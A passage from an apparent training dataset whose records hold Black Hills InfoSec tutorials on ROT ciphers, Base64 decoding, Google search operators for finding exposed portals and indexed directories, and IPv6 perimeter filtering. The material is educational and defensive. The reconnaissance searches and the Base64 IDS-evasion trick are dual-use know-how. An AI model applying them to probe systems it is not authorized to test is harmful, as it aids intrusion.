seeing it being used in some applications. Now, this is never a good idea, ever. Just don't ever allow your developers to use things like ROT. But as a security professional, you got to be able to understand when you see it, how to be able to identify it quickly and then eradicate it like you would a termite or roach someplace.\n\nSo if we're going to play around with ROT, we're going to be using the TR translate command on Linux to actually do this. I'm going to just take a basic bit of text and I'm just going to echo it through. So I'm going to echo \"I am sure there's a better way to do this!!!!!!\" and then we're going to pipe it through TR. What you're seeing with that TR command is we're basically saying translate and shift. We have capital A to capital Z, lowercase A to lowercase Z, and then it's going to translate that to an N. And that means N is going to be the starting character. So if you go A, B, C, D, E, F, G, H, I, J, K, L, M, N, that's 13. So it's going to rotate it over. So it's basically going to turn this text that I have, \"I am sure there's a better way to do this!!!!!!\" and we're going to translate it. And whenever I hit enter, you can see that it's converted it over to jibberish. If you play that backward, it brings your dogs and cats back to life.\n\nSo that's a really easy way to try to shift that. Of course, you can reverse it to try to get it down into normal text that we would be able to read a little bit easier. \n\nSo the whole point of all of this is whenever you're dealing with capture the flags or any of these different challenges that are online, you're going to come up with ROT. It's going to be something you're going to run into. It's kind of an inside joke from years back.\n\nHowever, there have been situations where we have actually seen this used in an application to obfuscate things like passwords. Now, trust me, there's far better ways to obfuscate passwords, but if you're a developer fresh out of community college and you've got to do some security and you don't understand security at all, this seems like a quick and easy way to try to obfuscate.\n\nSo some of the dead giveaways are the spacing and the lines themselves. If you have V, N, Z. So V, most of the English language is going to be multiple letters. So you would focus in on translating a V to like an I or a V to an A and so on, and then counting that offset and then doing that offset shift back to see if you can get it into something that's more useful.\n\nNow there's other versions of ROT. If you start seeing special characters being used, you might be using something or encountering something like ROT 47 or ROT 40 or some other variation that can use higher value ASCII characters. That means that they're actually rotating through the special characters as well. If you get that, you'll just have to play around with the different types of ROT encodings to play with it, but usually most CTFs, they don't go off the main ones that are normally used.\n\nSo I hope you like this video. Once again, this is being used with the BHIS Cyber Range. You'll see other ones pop up for things like BASE64 encoding and using hex editors and things of that nature. So thank you so much and I hope to see you in a new video sometime soon.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With Base64 Encoding and Decoding\"\nTaxonomies: \"Author, How-To, Informational, John Strand, Base64\"\nCreation Date: \"Wed, 29 Apr 2020 13:15:00 +0000\"\n\nhttps://youtu.be/TzG_iflIiig\n\nHello and welcome. My name is John Strand and in this video, we're going to be talking about Base64 encoding and decoding. Now the reason why we're talking about it is once again we have the BHIS Cyber Range for our customers and friends and this is just basically a video to walk people through some of the challenges that utilize Base64.\n\nNow the reason why Base64 actually exists is kind of interesting. Whenever you are transferring binary data or you're transferring data with special characters, it can be encoded and it can be garbled, especially whenever you're dealing with protocols that are designed predominantly for sending text. For example, if you're looking at something like HTTP, transports a lot of text and if we start sending binary, we might get into trouble. In fact, we see this all the time, especially with attacks like SQL where semi-colons get interpreted and get executed.\n\nThis is why protocols like this exist or different encoding formats like this exist. It allows you to convert things like binary and special character data into something that's far less benign like upper lower case and numbers and that's what we actually get whenever we're utilizing Base64 as an encoding mechanism. You'll see it all the time whenever you're doing web application, security assessments, looking at security parameters and tokens, and things of that nature. Let's play around a little bit with encoding and decoding Base64 and then some of the little challenges that you're going to run into.\n\nNow, in my example that I have up on my screen, we're going to be playing around with, \"I am sure there's a better way to do this434343!!!!!!\" or capital C, capital C, capital C in hex but we're not at that video yet. And we're going to pipe it through Base64. And that's going to encode it. As you can see, we have the, I am sure and the space and all that has been replaced with what looks like gibberish, but it's pretty much not malicious gibberish or mostly not malicious gibberish I suppose. It allows it to encode it in a way that it's easily transferred over clear text or plain text protocols.\n\nNow, one of the things you'll notice is sometimes with Base64 or a lot of the times it will end with \"equals equals\" and that has to do with padding. If your character set that's coming in doesn't land perfectly on the boundaries that Base64 is looking for, it'll actually pad it. Many times a telltale giveaway are the equal signs at the end, one or two. \n\nNow sometimes there won't be any. That will happen. That means the text landed on a perfect boundary and that's okay, but it's just something to look for. It's a quick and dirty trick.\n\nNow if we actually want to decode Base64 encoded data, we can, in fact, do that. Let me bounce out here and I'm just going to use straight-up Base64 decode. Now I utilized a switch, here you can see I did the --decode switch. And now whenever I hit enter, it's going to try to decode it and it's going to freak out. You can see right here it says, \"I'm sure there is a\" and then it goes ahh! Base64 invalid input. The reason why is I snuck in a couple of special characters in the middle of the Base64 encoded string. \n\nNow, why would anybody ever do that?\n\nWell, a lot of malware actually uses Base64. The reason why is very slight changes can actually alter signatures in a much more significant way whenever you're doing signature pattern matching within an executable. \n\nWhat some crafty attackers will do is they'll actually slip special characters in their Base64 encoded stream. And in doing that, any type of firewall or IDS that's using deep packet inspection to analyze that Base64 encoded data, will start throwing errors. Basically be like, mmm, there's something wrong here.\n\nNow if you're dealing with a string that has Base64 and it throws in some special characters, you can throw in the -i switch and with the -i switched does is it tells Base64, ignore garbage. You're going to decode this Base64 encoded string. \n\nAnd if you come across something that you don't quite understand, just don't worry. Ignore it. Pretend it never existed. Pretend that it never happened. And as you can see, it actually cleans up the output substantially in doing that.\n\nOnce again, this is used in the Black Hills Information Security Cyber Range and if you like it for Base64 encoding and decoding data, thank you. Check us out every single Wednesday on Enterprise Security Weekly and be sure to hit the subscribe button down below. We do tons of videos and tons of free education and webcasts at Black Hills InfoSec and I hope to see you on one of our videos or webcasts in the very near future. Thank you so much and take care.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With Basic Google Searches\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, John Strand, Google\"\nCreation Date: \"Mon, 04 May 2020 14:15:00 +0000\"\n\nhttps://youtu.be/l2hN3Tluzi0\n\nHello and welcome. My name is John Strand and in this video, we're going to be talking about some very basic Google searches.\n\nNow we've got to take a couple of steps back and talk about what Google actually does. Google goes through and it indexes all the different texts and images and things they can find on the internet. Once I had somebody describe Google's entire business model is just creating a reverse index of the internet, and that may or may not be true, but the point is, it's an incredibly powerful tool for security professionals to potentially identify weaknesses in their security architecture that Google has indexed.\n\nSo I'm going to just show you just a couple of very, very, very basic Google searches that you can use in a variety of capture the flag scenarios and against your own site to try to find some vulnerabilities.\n\nSo I'm going to start with some basic start searches that you can work with. One of the most heavily used ones is site:. The reason why we use site: is you can use site: and have your specific search focus in like a laser beam on just your domain. And usually, whenever I'm doing this I'm looking for something or I'm actually kind of... I'd like to think of it as like panning for gold. I'm sifting out all the things I don't care about to try to get down to something interesting.\n\nNow just to be clear, I'm not trying to hack any sites with this particular demo, but I'm showing you how you can identify vulnerabilities on your own infrastructure fairly quickly and fairly easily. So whenever I do a site:... And let's say I put in Microsoft. I put in Microsoft.com. That's going to restrict all of my searches to just Microsoft.com. So I can do site: Microsoft.com and do cats and we'll see if any website at Microsoft has anything from cats.\n\nAnd here we go. It says, all right, \"Download Kaggle Cats and Dogs dataset from Microsoft,\" cats at Microsoft stories. So you can see we restricted our search to just that. And that's pretty cool, especially whenever you're looking for files.\n\nSo you can look for things like doc or you can look for like docx or ppt or find any number of different file extensions. Usually, whenever I'm doing a search though on a site, what I'm trying to do is sift through things that are easily identified with Google to try to find the lesser-known things that Google has indexed.\n\nSo what I'll do is I'll do a site Microsoft.com or site: Microsoft.com. So let me put this in properly. So we've got site Microsoft.com. And now, what we can actually do is we can now start excluding things that I already know exist. So I could do -www because I don't care about www.Microsoft.com. And I can do -docs like that and it's going to exclude Microsoft docs. Here we got, what is it, go.Microsoft.com. It just says it's a Microsoft site. I might find that interesting and I'll throw it over. Once again, I'm not expecting to find anything like super, super interesting. We're not trying to do that at all, but I'm showing how you can exclude things, so I'm to do -go, go docs, and let's do -tech community. I want to remove that and then we'll do -support.\n\nSo if you look up here at the top, you can see that we're kind of building a list of all the different sites that exist at Microsoft. This may not sound all that interesting. However, whenever you're looking at this from a security practitioner's perspective, it becomes incredibly important, because there may be parts of your infrastructure that Google has indexed that you're exposing that you never expected to expose ever under any circumstances at all.\n\nFor example, you may have alternative VPN login portals, you may have remote administration pages for various websites, firewall administration pages, all kinds of different login pages, Tandberg devices, Polycom devices. All of these things will eventually show up as you start sifting through a website and all of the different parameters that can exist on that.\n\nIn fact, whenever I'm working with IANS, it's not uncommon for me when I'm talking on the phone for expert decision support, where I'm typing this in while I'm talking to a customer, and so far twice in the past three years, while I've done that on the phone with a customer, kind of a habit that I have, I have found completely exposed interfaces.\n\nFor example, I was able to find a full video camera interface for their security cameras for one of our customers. I was able to find a page without authentication that allows you to manage and edit and work with the certificates for TLS SSL on their websites. So this is pretty heavy stuff, and it just involves a little bit of curiosity and digging in.\n\nSome of my other ones that I like working with whenever I'm working with sites is I can work within title index of. Now the vast majority of what you find if you work with this particular Google search isn't all that interesting, but it does at least show how this can be useful. You see, if somebody is enabled indexable directories on their website, it does just that. It's an index of the directory structure for the webserver and many times this will allow you to identify various directories, pull down source code for pages... And by the way, the source code is completely different than what you see when you do view source. You may find things like user IDs and passwords for backend database connections.\n\nSo this is one of my all-time favorites working with \"index of\" and here's just a couple of examples from developer Apple.com and here's Apache software foundation distribution directory. Now, once again, I'm not trying to hack anything and show you, \"Oh, this is how you hack a site,\" but what happens is you'll see something very similar to this.\n\nIf you have a vulnerable website in your organization, you'll have a web server and it'll list out all the directories for that web server and then you're able to go into those various directories and you're able to see various files. Now that may not sound interesting, but once again, if you start getting the things like source code from indexable directories or documents with metadata, it starts getting very interesting, very, very quickly.\n\nSo this is just a basic Google search primer and these are the things that I do as table stakes anytime we're working on a pentest because these things many times will turn up vulnerabilities that your standard scanner may not turn up and set as critical.\n\nSo be sure to check it out on your own organization. So you'll go through and just do site:, your domain, and then you'll start doing minus the pages that you see show up. If you get all the way down to nothing, congratulations, and nothing surprises you, that's great. But if you start seeing things like weird authentication portals, default web pages, things of that nature, you're going to want to clean those up.\n\nSo thank you so much for joining this particular edition of Getting Started with Black Hills Information Security. And I hope to see you in another video.\n\nDon't forget to check us out every Wednesday where we do Enterprise Security Weekly. So thanks again and I can't wait to see you in another video.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Securely Deploying IPv6 in 2020 Part 1: Internet Facing Perimeter\"\nTaxonomies: \"Author, Informational, InfoSec 101, Joff Thyer, IPv6, Joff Thyer\"\nCreation Date: \"Mon, 11 May 2020 12:06:00 +0000\"\nJoff Thyer //\n\nIntroduction\n\nIf there is anything that the start of 2020 has taught us, it is that Internetworking services are in higher demand than ever before.  IPv4 is exhausted, and by that I mean there is none, it is tired, worn out, overused, abused, and beyond its end of life.  Besides our heroic attempts at variable-length subnetting which placed an enormous burden on enterprise routers, and exponentially grew the global route table, we still ran out of addresses.  \n\nNetwork Address Translation is equally overused and abused.  It is not and never was intended to be a security technology. NAT is simply address conservation, and the fact that we now have globally deployed natted networks behind other natted networks is beyond ridiculous, and more to the point stretching the intent well past its original design. We own a nod of appreciation to all those that have valiantly extended IPv4\u2019s life way beyond its shelf life, but it is truly past time to commit to IPv6.\n\n Users that use Google over IPv6 across the last decade\n\nRather than exclusively give a tutorial on IPv6, I am going to talk specifically about infrastructure security that we must have in place to safely deploy the protocol.\n\nWe should start with and understand some of the foundational knowledge. First of all, IPv6 is a 128-bit address space. It is known as IEEE 802 protocol 0x86DD within an Ethernet header, or if encapsulated in an IPv4 header, it is carried as IP protocol number 41. (6 in 4).\n\nAs of today, IANA has allocated out IPv6 address space across the world to the various Regional Internetworking Registries which consist of ARIN, RIPE NCC, APNIC, AFRINIC, LACNIC.\n\nFor additional background details:\n\nhttps://www.iana.org/assignments/ipv6-unicast-address-assignments/ipv6-unicast-address-assignments.txt\n\nhttps://en.wikipedia.org/wiki/Regional_Internet_registry\n\nThe address allocations are as follows.\n\n/12: seven IPv6 blocks spread across various RIR\u2019s.\n\n/16: one block for 6to4 translation\n\n/18: one block to RIPE NCC\n\n/19: two blocks, one to RIPE NCC, and another to APNIC\n\n/20: three blocks, one to RIPE NCC, and two to APNIC\n\n/22: three blocks to RIPE NCC.\n\n/23: eighteen address blocks spread across various RIR\u2019s.\n\n Percentage of Autonomous Systems that Announce an IPv6 prefix\n\nThese address allocations are enormous! If only 12 bits are set for the network prefix, then 116 bits can be further allocated by Internet Service Providers.  In pure host address terms, that is 2^116 which is 8.4 e24 addresses!   \n\nIt is the case that most service providers will further allocate addresses in /32, /48, and /64 blocks. Refer to https://tools.ietf.org/html/rfc6177 for more information as this is an active discussion. To view the current state of the IPv6 BGP global route table, refer to https://bgp.potaroo.net/v6/as2.0/index.html.\n\nRight now, it seems that if your organization is multi-homed with your own BGP Autonomous System Number (ASN), you are likely to be allocated an IPv6 /48 which is a whopping 2^80 addresses from which you can further sub-network into /64\u2019s.\n\nIf you are single-homed or tunneling, you will probably receive an IPv6 /64 allocation which is twice the size of the entire IPv4 address space and if you desire to do so, you can further subnet this space internally.\n\nI know, you are now thinking that you want in! After doing my initial homework, that\u2019s exactly what I thought. Being a total infrastructure and endpoint security consultant, malware developer, musician, mathematician, and outright geek, I just had to get my hands on this stuff as soon as I could.\n\nSo I called up my friends at my local ISP and I said, \u201cHey guys, I want an IPv6 address block\u201d. And they said, \u201cWe don\u2019t carry IPv6\u201d. (cue the \u201cyou just lost your PACMAN game\u201d music\u2026)  \n\nI am fortunate enough to have a small static IPv4 allocation, so I thought to myself \u201cit\u2019s time to tunnel\u201d so I can build an IPv6 testbed.  I went out and started researching, and came across this:\n\nhttps://en.wikipedia.org/wiki/List_of_IPv6_tunnel_brokers\n\nI chose to create an account with Hurricane Electric based on their widespread reach, and literally in a few minutes I was granted an IPv6 /64 address block as long as I tunnel the traffic using IP protocol 41. https://en.wikipedia.org/wiki/6in4 \n\nMy tunnel interface configuration on an Ubuntu system looks like this. ( well, with a few redactions).  You honestly did not think I was going to give you my IPv4/IPv6 addresses, did you?\n\n Linux 6in4 (protocol 41) Configuration\n\nNow you ask, \u201cWhat\u2019s the first thing I did as soon as that tunnel came up?\u201d.  It\u2019s pretty simple, I installed and configured DNS, because who in their right mind wants to remember an IPv6 address. Not too difficult with a debian Linux to do so:  \u201capt install bind9\u201d will do it but you probably want to adjust your settings to use the local resolver afterwards.\n\nAnd now for some basic connectivity testing. Wait, who would possibly have IPv6 deployed? I bet the usual suspects of sizable organizations like Google, Amazon, Microsoft, and Research Universities. I tested my local DNS resolver using our friend \u201cdig\u201d after learning how exactly to use it with IPv6. (I kid you not, adjusting your brain out of \u201cv4 mode\u201d is a real thing\u2026)\n\n Sample DNS Lookup Traffic using \u201cdig\u201d \n\nI think I have my sea legs, albeit wobbly so let\u2019s proceed further. Of course, we need to try ICMP echo request/reply and traceroute. In IPv6 world, these commands in Linux become \u201cping6\u201d, and \u201ctraceroute6\u201d.\n\n Sample ICMP Echo Request/Reply Traffic \n\n Sample \u201ctraceroute6\u201d Traffic \n\nAfter that high-level introduction, let\u2019s talk about security which is where the action really needs to be. I would like to break this down into four important topics, IPv6 Addressing and Scope, Internet Control Message Protocol (ICMPv6), and Perimeter Network Security. \n\nYou might notice that Internal Network Security is conspicuously absent. Considering the breadth of coverage here, I decided to leave the Internal Network Security topic for a follow-on article.\n\nIPv6 Addressing and Scope\n\nThere are three different kinds of IPv6 address, unicast, anycast, and multicast. Both unicast, and anycast addresses have two different scopes, these being link-local and global. For multicast, the four least significant bits in the second address octet determine the scope. Multicast addresses start with \u201cff0\u201d, and different scoped addresses are as follows:\n\nFF00 => reserved/unused\n\nFF01 => interface local (host bound / loopback multicast)\n\nFF02 => link local\n\nFF03 => realm local\n\nFF04 => admin local\n\nFF05 => site local\n\nFF08 => organization local\n\nFF0E => global\n\nFF0F => reserved/unused\n\nInternet Control Message Protocol Version 6 (ICMPv6)\n\nBefore I start these discussions, we cannot avoid talking about ICMPv6 without which IPv6 just will not work. The first fabulous and exciting revelation is that the IPv4 Address Resolution Protocol (ARP) is gone, and good riddance!\n\nIPv6 is very much multicast dependent for many functions, and a tremendous amount of discovery uses ICMPv6 and multicast together. Similar to ICMP in v4, there are ICMP types, and codes in the packet.\n\nICMPv6 can be broken down into four categories, Error Messages, Informational Messages, Neighbor Discovery Messages, and Other IPv6 Protocol Control Messages.\n\nError Messages\n\nType 0: Reserved / Unassigned\n\nType 1: Destination Unreachable. The code field contains the reason.\n\nCode 0: No route to destination\n\nCode 1: Administratively prohibited\n\nCode 2: Unassigned\n\nCode 3: Address Unreachable\n\nCode 4: Port Unreachable\n\nType 2: Packet too big. Important for the path MTU discovery mechanism to work properly.\n\nType 3: Time exceeded message\n\nCode 0: Hop limit exceeded in transit. (Life lesson: Don\u2019t let you TTL expire because you will be dropped.)\n\nCode 1: Fragment reassembly time exceeded\n\nType 4: Parameter problem message\n\nCode 0: Erroneous header field encountered\n\nCode 1: Unrecognized next header type\n\nCode 2: Unrecognized IPv6 option encountered\n\nTypes 5 through 127 are unassigned or reserved for experimentation\n\nInformational Messages\n\nType 128: Echo Request\n\nType 129: Echo Reply\n\nType 130: Multicast Listener Query\n\nType 131: Multicast Listener Report\n\nType 132: Multicast Listener Done\n\nNeighbor Discovery Messages\n\nType 133: Router Solicitation\n\nType 134: Router Advertisement\n\nType 135: Neighbor Solicitation\n\nType 136: Neighbor Advertisement\n\nType 137: Redirect\n\nOther IPv6 Protocol Control Messages as defined by various RFC\u2019s.  Types 138 - 161 are currently defined. Please refer to https://www.iana.org/assignments/icmpv6-parameters/icmpv6-parameters.xhtml for more information.\n\nTypes 162 - 255: Unassigned, Reserved or Experimental Use\n\nPerimeter Network Security\n\nAs you might imagine, with perimeter network security, many of the concepts we used for securing IPv4 can, in fact, be ported across to IPv6. For this part of the discussion, let\u2019s break the topics into categories as follows:\n\nAllocated Address Space Filtering\n\nAnti-Spoofing Filtering\n\nICMPv6 Filtering\n\nMulticast Filtering\n\nProtocol Normalization\n\nExterior Border Gateway Protocol Security\n\nDMZ/Internet Facing Server Address Allocation\n\nPerimeter: Allocated Address Space Filtering\n\nAn alternative topic name here might be \u201cReturn of The Martians\u201d or \u201cBogons Live Another Day\u201d. In short, there is a lot of unallocated address space in IPv6 and you should not allow a packet into your network unless it is sourced from an allocated address block.In reality, this is very simple. IANA has today allocated 35 address blocks. You can define an ACL on your perimeter router to only allow traffic sourced from these 35 blocks, and drop everything else. With my Linux tunneled solution, I used iptables and related ip sets, implementing as follows:\n\n Ip6tables IANA Allocated Filtering\n\nNote that in the screenshot above I am assuming that the router (tunnel endpoint) will not only possibly initiate traffic itself, but will be responsible for IP version 6 traffic forwarding across some defined sub-networks in the future.\n\nOf course, any OSI layer 4 filtering will have to be implemented in the above ruleset also so this represents just a baseline starting point. Remember that OSI layer 4 and up with IPv6 is fundamentally unchanged from IPv4.\n\nOne more thing to be aware of is that IANA allocations of IPv6 will of course change. In my case, I used a simple shell script to parse out the allocated blocks and update my IP set with the correct data. Because I am a nice guy, I am including that script here.\n\n Simple Script to Create a List of IANA IPv6 Allocations\n\nPerimeter: Anti-spoofing Filtering\n\nThe golden rule is that no packet should enter your network that has a source address representing your allocated address block. Equally, no packet should leave your network that has a destination address matching your allocated address block.\n\n Ip6tables anti-spoofing filtering\n\nPerimeter: ICMPv6 Filtering\n\nAs stated above, with ICMPv6 the IPv6 protocol just breaks making the topic of securing ICMPv6 extremely critical not just for the perimeter but for the interior of your networks also. You cannot take the IPv4 style naive approach of just dropping this protocol but rather you need to be more nuanced.\n\nFiltering ICMPv6 can be broken into two categories, that being traffic that is initiated from a perimeter security device, versus that being traffic that should transit the security device. I will keep this portion of the discussion to transit traffic that is important to the perimeter security policy stance of an organization.\n\nTransit traffic you should allow to pass through to/from the Internet.  All other transit ICMPv6 traffic should be dropped. These are my opinions combined with interpretation of https://www.ietf.org/rfc/rfc4890.txt.\n\nType 1: destination unreachable, you might optionally be selective and pick \u201cport unreachable\u201d code only.\n\nType 2: Packet too big. You don\u2019t want to break path MTU discovery.\n\nType 3: Time exceeded but code 0 (TTL/hop limit expired) only.\n\nType 4: Parameter problem (codes 0 and 1 only)\n\nType 128/129: Optionally you can allow ICMP echo request/reply at your discretion but the same caveats as IPv4 apply. If you drop, you can break Teredo tunneling so apply with care.\n\nTypes 144 - 147 apply to mobility enabled networks and can optionally be dropped with an understanding of the loss of functionality.\n\nAnother important point is that an organization needs to make a policy and operational decision related to whether the organization wants to participate in global multicast sources. If so, then transit traffic will need to include multicast router discovery, advertisement, and termination messages which are types 151 through 153.\n\nWith regard to ICMPv6 messages initiated from the perimeter security device, the above list, excluding the mobility enabled types 144-147 should be allowed to pass.  In addition, address selection and router selection messages should be allowed to pass including:\n\nTypes 133-134: Router solicitation/advertisement\n\nTypes 135-136: Neighbor solicitation/advertisement\n\nTypes 141-142: Inverse Neighbor Discovery solicitation/advertisement\n\nAll other multicast receiver, router discovery, and also SEND path notification messages. (refer to RFC)\n\nICMPv6 Type 137, Redirect Messages represent a significant security threat and should always be dropped. As with any network packet filtering, a default \u201cdeny all\u201d unless explicitly permitted is the most sound approach.\n\nIf possible, implement packet inspection of the source and destination addresses of any unicast ICMPv6. Specifically, if the embedded payload within the packet does not have a destination address that matches the source address of the ICMPv6 packet, it should be dropped. Conversely, if the embedded packet payload does not have a source address that matches the destination of the message, it should be dropped.\n\nIn addition to these filtering decisions, you should always limit the potential for denial of service attacks by applying rate-limiting configuration for all ICMPv6 messaging.\n\nIn my opinion, no policy decision is warranted on unallocated, reserved or private experimental messages for ICMPv6. All of these remaining messages should be dropped.\n\nFor your information, here are my Linux iptables rules for forwarding transit ICMPv6 across my router which are very ICMPv6 type-specific with an applied rate limiter.\n\n ICMPv6 Packet Forwarding Rules\n\nAlso below is a screenshot of ICMPv6 iptables rules for handling neighbor and router discovery within the internal LAN. These are deliberately not applied to the tunneled ipv6 interface, and there is, of course, a default packet drop policy beyond that which is accepted.\n\n ICMPv6 Router/Neighbor Discovery Rules\n\nPerimeter: Multicast Filtering\n\nIf inter-domain multicast is not desirable, then strict perimeter filtering is essential. Additionally, any spoofing of packets with multicast as a source address are certainly spoofed and should be dropped. Assuming that your policy is to not participate in inter-domain multicast, then you should filter the following at your perimeter:\n\nAny packet with a source address that is multicast\n\nBlock/drop reserved and unused/unassigned multicast destinations\n\nFF00::/16 (reserved)\n\nFF06::/16, FF07::/16 (unassigned)\n\nFF09::/16 through FF0D::/16 (unassigned)\n\nFF0F::/16 (reserved)\n\nBlock/drop all global scope multicast destinations (FF0E::/16)\n\nBlock/drop all site-local scope multicast destinations (FF05::/16)\n\nBlock/drop all organization-local scope multicast destinations (FF08::/16)\n\nConsider blocking/dropping realm-local (FF03::/16). These will be specific to other RFC\u2019s and must be a policy decision. \n\nFor more specific information, please refer to https://tools.ietf.org/html/rfc7346.\n\nPerimeter: Protocol Normalization\n\nIPv6 has a protocol header labeled \u201cnext header\u201d. It is possible to continue chaining extension headers together into an extremely long chain of extension headers before the OSI layer 4 headers are encountered.\n\n Extension Header Example\n\nIt is possible to create a denial of service attack using long chains of extension headers all of which need to be processed by perimeter security firewalls and/or routers.\n\nExtension header attacks can also be leveraged to blind Intrusion Prevention Systems (IPS) through the prevention of full packet inspection.\n\n Table of IPv6 Extension Headers\n\nOutside of the above table of extension headers, the normal OSI layer 4 protocol numbering is used for TCP (6), and UDP (17). Absent from the above table is extension header 59 which has a special meaning of \u201cno next header\u201d.\n\nThere are some normalization rules which should be enforced by packet inspection devices such as firewalls, and intrusion prevention systems.\n\nEach extension header should not appear more than once except the destination options header.\n\nThe Hop-By-Hop options header should only appear once and should always be the first header in the list.\n\nThe destination options header should be last in the list and should appear at most twice.\n\nThe fragment header should not appear more than once.\n\nI think it is fairly self-evident that extension headers present security risk if not properly normalized and/or filtered, and also present denial of service risk if processed by packet normalization devices.\n\nOne particular security concern presented is the use of the Routing Options Header (43) along with type 0, known as an RH0 attack.  Routing headers are very similar to IPv4 strict source, and loose source routing options which allow an attacker to specify a particular layer 3 path through which to route a packet.\n\nWorse still is a use case whereby the same address can be included in a single Routing Header multiple times setting up a potential packet oscillation and amplification attack.\n\nWithin both the destination options header and the hop-by-hop options header there is a possibility that padding options (PADN) might be included to pad to an 8-octet boundary. These padding options must always be set to the value of zero, otherwise could be seen as a covert channel mechanism.\n\nSummary Recommendations:\n\nEnsure that a packet normalization device (firewall or IPS) is able to enforce the extension header rules listed above.\n\nDrop any traffic that contains a Routing Options Header (43) with type 0 (source routing).\n\nDrop any traffic wherein padding options within destination or hop-by-hop extension headers contain data other than zeroes.\n\nDrop any traffic that contains extension headers that are reserved, undefined, or otherwise used for experimentation and testing.\n\nExterior Border Gateway Protocol Security\n\nThe border gateway protocol (BGP) is still with us and widely used for both IPv4 and IPv6 wide area route tables. Fortunately, with the introduction of the IPv6 route table and the leveraging of class-specific address boundaries, the size and processing requirements are significantly less than the highly fragmented IPv4 route table.\n\nSimilar security concerns for deploying BGP in the IPv6 world as have been present with IPv4.\n\nUse explicitly configured BGP peers\n\nThreats include TCP sequence number prediction because BGP is a long-lived connection.\n\nUse hash-based peer authentication.  MD5 hashes are still common.\n\nOptionally leverage an IPSEC tunnel for peering.\n\nUse loopback addresses for peering\n\nIP peer address cannot be easily determined through traceroute\n\nFilter BGP peer traffic based on packet hop limit (TTL). The peer router will send BGP with a hop limit of 255 so only accept BGP traffic that has a hop limit of 254 and higher.\n\nFilter the prefix length being received. Most providers will just filter based on /32 and shorter or a specific prefix length.\n\nFilter long autonomous system number (ASN) paths. Using some form of route policy map can be used to enforce AS paths to less than a specific length. A number at or around 40 should be plenty. See below graph from https://bgp.potaroo.net/cgi-bin/plota?file=%2fvar%2fdata%2fbgp%2fv6%2fas2%2e0%2fbgp%2dmax%2daspath%2dlength%2etxt&descr=Maximum%20AS%20Path%20length&ylabel=Maximum%20AS%20Path%20length&with=step.\n\nMaximum AS Path Length Over Time \n\nFilter private AS numbers in routing updates. IANA has designated AS numbers 64512 - 65534 as private.\n\nFilter reserved AS numbers in routing updates (0, and 65535).\n\nLog BGP neighbor activity!\n\nDisable ICMPv6 Neighbor Discovery (ND) between BGP peers.  There is no need for it.\n\nIf at all possible, consider deploying Unicast Reverse Path Forwarding checks (URPF). In strict mode, a packet must be received on an interface that the router would use to route a destination/return packet to. In loose mode, a packet must be received on any interface that is contained as a destination somewhere in the route table.\n\nPerimeter: DMZ/Internet Facing Server Address Allocation\n\nOnce you have secured your address allocation, you probably are dealing with either a /48 or a /64 address block. Now, of course, like any other organization, you are welcome to further sub-network this allocation however you please.\n\nWhether in a cloud-hosted situation or your own DMZ/Internet-facing deployment, I would recommend you keep the sub-network fairly large in size. You might choose for example to carve up your /64 block into /72 sub-networks or similar and perhaps allocate one or two of these for your organizational DMZ.\n\nWhen you perform subnetting, while your router gateway address will probably be predictably allocated for consistency, it is highly recommended to allocate your server addresses in a random fashion. This will mitigate the risk of server discovery during the scanning/reconnaissance attack phase. Since the address space is so vast, this becomes in effect a \u201csparse\u201d allocation making discovery significantly challenging.\n\nYou would also want to statically address your server rather than depending on IPv6 Stateless Address Autoconfiguration (SLAAC) which is more suitable for client-side station address allocation in a residential ISP context. In a managed organizational context, operators will more likely prefer DHCPv6 for address allocation due to the extra control than can be exerted.\n\nYou could even go as far as to randomly change your address allocation as long as you retain the ability to efficiently update the associated DNS infrastructure.\n\nAn alternative to this would be to sequentially cluster your static addressing choices toward one portion of the address space. Perhaps, for example, starting from one address different from the router address. This would fall under the category of predictable address allocation, and such knowledge would potentially speed up resource/asset discovery.\n\nTools for Infrastructure Security Testing\n\nAs we progressed through this article you can already see that I have used a number of tools for testing and probing purposes. Some are included in a standard Linux distribution whereby some more advanced tools are not.\n\nScapy python packet crafting and research tool. (http://scapy.net) \n\nPing6 (linux built-in)\n\nTraceroute6 (linux built-in)\n\nhttps://www.si6networks.com/tools/ipv6toolkit/\n\nhttps://github.com/vanhauser-thc/thc-ipv6\n\nSome of the toolkit orientated tools mentioned above are more focused on LAN/Internet Network attacks in an IPv6 context. The general internal network security posture is in fact significantly compromised the longer we remain in a dual-stack (IPv6/IPv4) environment. Unfortunately, like so many things, this part of our work is going to be the hardest migration phase to tackle for many unless you are lucky enough to be operating in a greenfield.\n\nConclusions\n\nThere is no doubt that there is enough depth of experience for us to take the plunge into the world of IPv6. Organizations should definitely be looking at providing Internet-facing services with appropriate protections available in the IPv6 domain. Residential internet service providers are already struggling to continue with any IPv4 and will continue to move towards IPv6. This leaves us with internal network security concerns which I will write about in a future article.\n\nMany different sources of information were used in constructing this article which include:\n\nIPv6 Security by Scott Hogue (Cisco press)\n\nhttps://www.apnic.net/community/ipv6-program/ipv6-bcp/\n\nhttps://www.team-cymru.com/\n\nhttps://www.iana.org/assignments/ipv6-address-space/ipv6-address-space.xhtml\n\nhttps://www.cidr-report.org/v6/as2.0/\n\nhttps://bgp.potaroo.net/index-v6.html\n\nhttp://v6asns.ripe.net/v/6\n\n"
    },
    {
        "input": "",
        "instruction": "",
